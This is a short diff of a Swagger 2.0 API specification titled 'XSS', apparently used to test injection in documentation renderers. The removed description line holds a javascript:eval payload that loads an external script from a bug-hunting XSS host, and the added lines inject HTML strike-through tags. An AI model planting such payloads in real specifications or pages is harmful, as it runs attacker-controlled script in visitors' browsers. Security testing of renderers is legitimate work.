@@ -2,10 +2,10 @@ swagger: '2.0'
 info:
   version: "0.0.2"
   title: XSS
-  description: javascript:eval('var a=document.createElement('script');a.src='https://bugxss.bxss.in';document.body.appendChild(a)')
+  description: <s>sssssssssssssssssssssssss</s>
 paths:
   /:
     get:
       responses:
         200:
-          description: Successful response
+          description: Successful response<s>sssssssssssssssssssssssss</s>
